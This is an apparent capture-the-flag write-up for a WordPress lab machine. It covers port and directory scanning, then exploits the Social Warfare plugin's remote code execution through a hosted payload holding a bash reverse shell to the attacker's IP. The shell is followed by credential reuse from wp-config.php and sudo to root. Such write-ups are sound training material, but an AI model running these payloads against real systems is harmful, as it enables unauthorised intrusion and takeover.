# Export
```bash
export IP="192.168.162.123"
export URL="http://192.168.162.123:80/FUZZ"
```

<hr>

# Credentials
+ Local user: `takis:R3&]vzhHmMn9,:-5`

<hr>

# RCE
```bash
searchsploit wordpress social warfare
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                                                                                             | php/webapps/46794.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

+ Create a `payload.txt`

```bash
<pre>system('bash -c "bash -i >& /dev/tcp/192.168.49.162/53 0>&1"')</pre>
```

+ Start a HTTP server.

```bash
$ python3 -m http.server 80
```

+ Code execution

```bash
$ curl -s http://192.168.162.123/wordpress/wp-admin/admin-post.php\?swp_debug=load_options\&swp_url=http://192.168.49.162/payload.txt
```

```bash
$ nc -nlvp 53                                                                                                                                                                           1 ⨯
listening on [any] 53 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.123] 51492
bash: cannot set terminal process group (514): Inappropriate ioctl for device
bash: no job control in this shell
www-data@wpwn:/var/www/html/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<hr>

# Privilege Escalation
+ `wp-config.php` file

```bash
www-data@wpwn:/var/www/html/wordpress$ cat wp-config.php
<?php
...
define( 'DB_NAME', 'wordpress_db' );            
/** MySQL database username */
define( 'DB_USER', 'wp_user' );                       
/** MySQL database password */
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );               
```

+ SUDO

```bash
takis@wpwn:~$ sudo -l
Matching Defaults entries for takis on wpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User takis may run the following commands on wpwn:
    (ALL) NOPASSWD: ALL
```

```bash
takis@wpwn:~$ sudo su
root@wpwn:/home/takis# id
uid=0(root) gid=0(root) groups=0(root)
```

<hr>

# Nmap
```bash
$ nmap --open -sV -A -p- -vv -n -Pn -oN nmap/services.txt 192.168.162.123
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

<hr>

# Web Application
+ Directory

```bash
$ ffuf -u $URL -w /usr/share/seclists/Discovery/Web-Content/common.txt | tee ffuf/http.txt
index.html              [Status: 200, Size: 23, Words: 4, Lines: 4]
robots.txt              [Status: 200, Size: 57, Words: 10, Lines: 3]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
wordpress               [Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: [4686/4686] :: Job [1/1] :: 156 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

+ Scan WordPress → Valid user: `admin`
```bash
$ wpscan --url http://192.168.162.123/wordpress/ -e u,ap -t 10
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_| 
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18 
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...
[+] social-warfare
 | Location: http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |                                    
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)          
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.162.123/wordpress/, Match: 'Social Warfare v3.5.2'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/readme.txt
...
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection) 
```
